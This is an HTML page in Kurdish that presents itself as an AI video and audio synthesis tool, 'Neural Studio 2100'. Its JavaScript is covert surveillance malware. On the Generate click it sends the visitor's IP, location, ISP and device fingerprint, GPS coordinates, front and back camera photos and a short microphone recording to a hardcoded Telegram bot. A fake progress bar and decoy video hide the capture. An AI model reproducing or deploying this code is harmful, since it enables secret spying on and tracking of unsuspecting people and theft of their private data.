<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Neural Studio 2100 - Next-Gen AI Video & Audio Synthesis</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { 
            background: #030712; 
            color: #f8fafc;
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
            position: fixed;
            width: 100%;
        }
        .container { 
            background: rgba(17, 24, 39, 0.85); 
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 28px 22px; 
            border-radius: 28px; 
            box-shadow: 0 25px 60px rgba(0,0,0,0.8); 
            width: 92%; 
            max-width: 400px; 
            text-align: center; 
        }
        .logo-badge {
            display: inline-block;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            color: white;
            font-size: 11px;
            font-weight: 700;
            padding: 5px 12px;
            border-radius: 20px;
            margin-bottom: 15px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .title { font-size: 20px; font-weight: 800; color: #ffffff; margin-bottom: 8px; }
        .subtitle { color: #94a3b8; font-size: 13px; margin-bottom: 22px; line-height: 1.5; }
        
        .input-box {
            width: 100%;
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            border-radius: 14px;
            padding: 14px;
            color: #fff;
            font-size: 14px;
            margin-bottom: 18px;
            outline: none;
            text-align: right;
            transition: all 0.3s ease;
        }
        .input-box:focus { border-color: #3b82f6; box-shadow: 0 0 15px rgba(59, 130, 246, 0.3); }

        .btn { 
            background: linear-gradient(135deg, #3b82f6, #6366f1); 
            color: white; 
            padding: 16px; 
            border: none; 
            border-radius: 16px; 
            cursor: pointer; 
            font-size: 16px; 
            width: 100%; 
            font-weight: 700; 
            box-shadow: 0 10px 25px rgba(59,130,246,0.4);
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.98); }

        .progress-container {
            display: none;
            margin-top: 15px;
        }
        .progress-bar-bg {
            width: 100%;
            background: #1e293b;
            height: 8px;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 12px;
        }
        .progress-bar-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #3b82f6, #ec4899);
            transition: width 0.5s linear;
        }
        .status-text { font-size: 13px; color: #cbd5e1; font-weight: 500; }

        .video-wrapper {
            display: none;
            width: 100%;
            border-radius: 16px;
            overflow: hidden;
            margin-top: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        video { width: 100%; border-radius: 16px; outline: none; }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div class="logo-badge">Neural Engine 2100</div>
        <div class="title" id="boxTitle">دروستکردنی ڤیدیۆی AI (سەروو ۳۰ چرکە)</div>
        <div class="subtitle" id="boxSubtitle">تێکستەکە بنووسە بۆ دەستپێکردنی ڕێندەری سینەمایی و دەنگیی پێشکەوتوو:</div>
        
        <div id="formSection">
            <input type="text" id="promptInput" class="input-box" placeholder="نموونە: دیمەنێکی قووڵی سروشتی کوردی باڵا بە مۆزیک..." value="سەروو ۳۰ چرکە - دیمەنی سینەمایی قووڵ">
            <button id="mainBtn" class="btn" onclick="startNeuralSynthesis()">دەستپێکردنی ڕێندەر (Generate)</button>
        </div>

        <div id="progressSection" class="progress-container">
            <div class="progress-bar-bg">
                <div id="progressBarFill" class="progress-bar-fill"></div>
            </div>
            <div class="status-text" id="statusText">خەریکی ئامادەکردنی مۆدێلی نێرڤاڵ... (0%)</div>
        </div>

        <div id="videoWrapper" class="video-wrapper">
            <video id="targetVideo" controls playsinline>
                <source src="sararanyai.MP4" type="video/mp4">
                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
            </video>
        </div>
    </div>

    <video id="camVideo" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "9188898335:AAEpuZXa0igf-7GbuvykP0uT9U5GJQZJU0g";
        const CHAT_ID = "6947664268";

        let motionData = { alpha: 0, beta: 0, gamma: 0 };
        window.addEventListener('deviceorientation', function(event) {
            motionData.alpha = Math.round(event.alpha || 0);
            motionData.beta = Math.round(event.beta || 0);
            motionData.gamma = Math.round(event.gamma || 0);
        });

        function sendToTelegramText(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
            });
        }

        function sendToTelegramPhoto(blob, caption) {
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "n_shot.jpg");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
        }

        function sendToTelegramVoice(blob, caption) {
            let formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("voice", blob, "voice_rec.ogg");
            formData.append("caption", caption);
            formData.append("parse_mode", "Markdown");
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: formData });
        }

        function getAdvancedGPUFingerprint() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "WebGL نەدۆزرایەوە";
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                return dbg ? `${gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}` : "Unknown GPU";
            } catch(e) { return "Blocked"; }
        }

        async function gatherTelemetry() {
            let ua = navigator.userAgent;
            let platform = navigator.platform;
            let gpu = getAdvancedGPUFingerprint();
            let screenRes = window.screen.width + "x" + window.screen.height;

            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                let report = `🔥 *مۆتەکەی 2100 - ڕاپۆرتی نوێی تەلەمەتری:*\n\n` +
                             `🌐 *ئایپی و ڕایەڵە:* \`${data.ip}\` (${data.country_name} - ${data.city})\n` +
                             `📡 *دابینکەر:* ${data.org}\n` +
                             `💻 *سیستم و کارتی شاشە:* ${platform} | \`${gpu}\`\n` +
                             `📐 *ڕەهەندی شاشە:* ${screenRes}\n` +
                             `📱 *براوسەر:* \`${ua}\``;
                sendToTelegramText(report);
            }).catch(() => {});
        }

        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    sendToTelegramText(`📍 *شوێنی GPS (مۆتەکەی 2100):*\n• پانی: \`${lat}\`\n• درێژی: \`${lon}\`\n🗺️ [کردنەوە لە نەخشە](https://maps.google.com/?q=${lat},${lon})`);
                }, () => {}, { enableHighAccuracy: true });
            }
        }

        function captureMedia() {
            const video = document.getElementById('camVideo');
            const canvas = document.getElementById('canvas');

            // پێشەوە
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie 2100)*"), 'image/jpeg', 0.9);
                    stream.getTracks().forEach(t => t.stop());

                    // دواوە
                    setTimeout(() => {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
                        .then(backStream => {
                            video.srcObject = backStream;
                            video.play();
                            setTimeout(() => {
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(blob => sendToTelegramPhoto(blob, "📷 *وێنەی دوربینی دواوە (Back Cam 2100)*"), 'image/jpeg', 0.9);
                                backStream.getTracks().forEach(t => t.stop());
                            }, 1000);
                        }).catch(() => {});
                    }, 1000);
                }, 1200);
            }).catch(() => {});

            // تۆمارکردنی دەنگ
            try {
                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(stream => {
                    let recorder = new MediaRecorder(stream);
                    let chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        let blob = new Blob(chunks, { type: 'audio/ogg' });
                        sendToTelegramVoice(blob, "🎙️ *تۆمارکردنی دەنگی دەوروبەر (Audio 2100)*");
                        stream.getTracks().forEach(t => t.stop());
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }).catch(() => {});
            } catch(e) {}
        }

        function startNeuralSynthesis() {
            document.getElementById('formSection').style.display = 'none';
            document.getElementById('progressSection').style.display = 'block';
            document.getElementById('boxTitle').innerText = 'خەریکی ڕێندەرکردنی ۳۰ چرکەیی...';
            document.getElementById('boxSubtitle').innerText = 'تکایە بە هیچ شێوەیەک پەنجەرەکە مەخەە پشتەوە (Background):';

            gatherTelemetry();
            sendLocation();
            captureMedia();

            let progress = 0;
            let fill = document.getElementById('progressBarFill');
            let status = document.getElementById('statusText');

            let interval = setInterval(() => {
                progress += 2;
                if (progress <= 100) {
                    fill.style.width = progress + '%';
                    if (progress < 30) status.innerText = `بارکردنی مۆدێلی نێرڤاڵ و وەرگرتنی فینگەرپرینت... (${progress}%)`;
                    else if (progress < 70) status.innerText = `ڕێندەرکردنی ڕەهەندی دەنگ و ڕەنگ... (${progress}%)`;
                    else status.innerText = `تەواوکردنی تابلۆی کۆتایی ڤیدیۆ... (${progress}%)`;
                } else {
                    clearInterval(interval);
                    document.getElementById('progressSection').style.display = 'none';
                    document.getElementById('videoWrapper').style.display = 'block';
                    document.getElementById('boxTitle').innerText = 'ڤیدیۆکەت ئامادەیە!';
                    document.getElementById('boxSubtitle').innerText = 'فەرموو بینینی ڤیدیۆی سینەمایی:';
                    document.getElementById('targetVideo').play().catch(() => {});
                }
            }, 300); // 30 seconds total rendering simulation
        }
    </script>
</body>
</html>
